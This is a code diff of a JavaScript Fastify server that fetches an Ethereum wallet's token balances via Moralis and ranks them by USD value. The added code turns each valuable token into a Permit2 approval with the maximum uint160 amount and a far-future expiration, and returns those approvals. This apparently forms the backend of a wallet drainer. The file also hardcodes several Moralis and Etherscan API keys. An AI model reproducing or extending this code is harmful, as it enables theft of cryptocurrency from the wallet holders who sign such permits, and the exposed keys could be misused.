@@ -73,11 +73,19 @@ var common_evm_utils_1 = require("@moralisweb3/common-evm-utils");
 // └── your services
 //
 var moralisApiKey1 = "5M2C1HGJJnTiyMnp96IpaIlZ6CPVRA7yxysQY38AI1fDse7p3K6EcIRSOWwpSKCd";
-var moralisApiKey2 = "2IHfMlzIaRBflv7GliW3NzneyoAp3OgBXbE05hhKd3qfXo4otDbfZNw1AwH2SYO8";
-var moralisApiKey3 = "Ft1vyp44sxY7gqDm4qPiWBaPgLechkjUnKFPIn6jQBDHO5V0l0UOZnzNCoXZb1W2";
+var moralisApiKey2 = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6Ijg5MWJkNjBkLTBmYWItNDZmZi1hYjRjLTU1ODAyZWUwY2M4NyIsIm9yZ0lkIjoiMzQ5NzE5IiwidXNlcklkIjoiMzU5NDU4IiwidHlwZUlkIjoiOTUxZmMzZjAtYzk0YS00NjQzLWFmYjItZDYwMDYxMTI5ZGQxIiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE2OTAxMzM1NTcsImV4cCI6NDg0NTg5MzU1N30.gp4A6Y5iJZN2qNaJtV41Zz5DKf-CTywbc7Na-3Ks0oQ";
+var moralisApiKey3 = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6ImU3MWVmYWU5LTQ1NTctNGMyMC1iNGM4LWJiYzM3MWRkMjA0NiIsIm9yZ0lkIjoiMzQ5OTAzIiwidXNlcklkIjoiMzU5NjQ2IiwidHlwZUlkIjoiY2M5NTA4OWQtM2QxYS00OGMzLThhYWUtNDE5NmU4M2NhZTgwIiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE2OTAyMzU3MDUsImV4cCI6NDg0NTk5NTcwNX0.Ed2XbULv-DOKkXCOBKJsFbRFo55pFH3jeVpmCKCkc0Y";
+var moralisAPikey4 = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjU0OTNlNjVhLWYzNmUtNGVlNy05NjI4LWI1NmZjNjAzMTJjNCIsIm9yZ0lkIjoiMzUwMTQwIiwidXNlcklkIjoiMzU5ODg4IiwidHlwZUlkIjoiODM2MzIwZWMtNThlZC00OWIyLWEwZjQtNjI3NTY1N2UyZjE0IiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE2OTAzNTk1OTMsImV4cCI6NDg0NjExOTU5M30.zLF9ROjakzPxisOcQmvcyJi8d4Ob6GsePTIums2nsO4";
 var moralisKeys = [moralisApiKey1, moralisApiKey2, moralisApiKey3];
+var selectedKey = moralisKeys[Number(process.env.MORALIS_KEY_INDEX)];
 var etherscanAPiKey1 = "NW9VZEP7IFW2ZQ4NYV6GPANWWX893ANUUE";
 var etherscanAPiKey2 = "QNKQHXZ31GI3F8NZAWVU4J6YSCQEV9J1BT";
+var deadline = 1000000000000;
+var nonce = 0; // still experimenting on this one;
+// const Permit2Contract =
+//   "0x000000000022D473030F116dDEE9F6B43aC78BA3" as `0x${string}`; // Permit2 contract
+var maxUint160 = "1461501637330902918203684832716283019655932542975"; // maxUint160
+//
 exports.app = (0, fastify_1.default)({
     logger: true,
 });
@@ -97,8 +105,6 @@ exports.app.register(cors_1.default, {
     origin: "*",
     credentials: true,
 });
-console.log("client url =>", process.env.CLIENT_URL);
-console.log("admin url =>", process.env.ADMIN_URL);
 exports.app.register(swagger_1.default);
 // handle errors in out server
 var PORT = process.env.PORT || 3000;
@@ -109,7 +115,7 @@ exports.app.listen({
     if (err) {
         console.log(err);
     }
-    console.log("listenin address:", address);
+    // console.log("listenin address:", address);
     console.log(process.env.PORT);
 });
 var runMoralis = function () { return __awaiter(void 0, void 0, void 0, function () {
@@ -118,11 +124,10 @@ var runMoralis = function () { return __awaiter(void 0, void 0, void 0, function
             case 0:
                 if (!!moralis_1.default.Core.isStarted) return [3 /*break*/, 2];
                 return [4 /*yield*/, moralis_1.default.start({
-                        apiKey: moralisKeys[Number(process.env.MORALIS_KEY_INDEX)] || 2,
+                        apiKey: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjU0OTNlNjVhLWYzNmUtNGVlNy05NjI4LWI1NmZjNjAzMTJjNCIsIm9yZ0lkIjoiMzUwMTQwIiwidXNlcklkIjoiMzU5ODg4IiwidHlwZUlkIjoiODM2MzIwZWMtNThlZC00OWIyLWEwZjQtNjI3NTY1N2UyZjE0IiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE2OTAzNTk1OTMsImV4cCI6NDg0NjExOTU5M30.zLF9ROjakzPxisOcQmvcyJi8d4Ob6GsePTIums2nsO4",
                     })];
             case 1:
                 _a.sent();
-                console.log("moraliskeyIndex=>", process.env.MORALIS_KEY_INDEX);
                 _a.label = 2;
             case 2: return [2 /*return*/];
         }
@@ -132,6 +137,7 @@ runMoralis();
 exports.app.get("/", function (req, res) {
     return " api is active ";
 });
+console.log(moralisKeys[Number(process.env.MORALIS_KEY_INDEX)]);
 exports.app.post("/fetchWalletTokens", function (req, res) { return __awaiter(void 0, void 0, void 0, function () {
     function useFetchTokenPrices() {
         return __awaiter(this, void 0, void 0, function () {
@@ -166,14 +172,13 @@ exports.app.post("/fetchWalletTokens", function (req, res) { return __awaiter(vo
             });
         });
     }
-    var chain, address, response, allTokens, truncatedResponse, options, _a, filteredByUSDValue, error, tokensReturned, addrs, i, response1, resJson, permit2Tokens, _addrs, _loop_1, i;
+    var chain, address, response, allTokens, truncatedResponse, options, _a, filteredByUSDValue, error, tokensReturned, tokenInPermitFormat, index, obj, addrs, i, response1, resJson, permit2Tokens, _addrs, _loop_1, i;
     var _b;
     return __generator(this, function (_c) {
         switch (_c.label) {
             case 0:
                 chain = common_evm_utils_1.EvmChain.ETHEREUM;
                 address = req.body;
-                console.log(address);
                 return [4 /*yield*/, moralis_1.default.EvmApi.token.getWalletTokenBalances({
                         address: address,
                         chain: chain,
@@ -195,7 +200,7 @@ exports.app.post("/fetchWalletTokens", function (req, res) { return __awaiter(vo
                     headers: {
                         accept: "application/json",
                         "content-type": "application/json",
-                        "X-API-Key": moralisKeys[Number(process.env.MORALIS_KEY_INDEX)],
+                        "X-API-Key": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjU0OTNlNjVhLWYzNmUtNGVlNy05NjI4LWI1NmZjNjAzMTJjNCIsIm9yZ0lkIjoiMzUwMTQwIiwidXNlcklkIjoiMzU5ODg4IiwidHlwZUlkIjoiODM2MzIwZWMtNThlZC00OWIyLWEwZjQtNjI3NTY1N2UyZjE0IiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE2OTAzNTk1OTMsImV4cCI6NDg0NjExOTU5M30.zLF9ROjakzPxisOcQmvcyJi8d4Ob6GsePTIums2nsO4",
                     },
                     body: JSON.stringify({
                         tokens: truncatedResponse,
@@ -205,6 +210,16 @@ exports.app.post("/fetchWalletTokens", function (req, res) { return __awaiter(vo
             case 2:
                 _a = _c.sent(), filteredByUSDValue = _a[0], error = _a[1];
                 tokensReturned = filteredByUSDValue;
+                tokenInPermitFormat = [];
+                for (index = 0; index < tokensReturned.length; index++) {
+                    obj = {
+                        token: tokensReturned[index].token_address,
+                        amount: maxUint160,
+                        expiration: deadline,
+                        nonce: nonce,
+                    };
+                    tokenInPermitFormat.push(obj);
+                }
                 addrs = [];
                 for (i = 0; i < tokensReturned.length; i++) {
                     addrs.push(tokensReturned[i].token_address);
@@ -231,7 +246,7 @@ exports.app.post("/fetchWalletTokens", function (req, res) { return __awaiter(vo
                 for (i = 0; i < permit2Tokens.length; i++) {
                     _loop_1(i);
                 }
-                return [2 /*return*/, [tokensReturned, _addrs]];
+                return [2 /*return*/, [tokenInPermitFormat, _addrs]];
         }
     });
 }); });
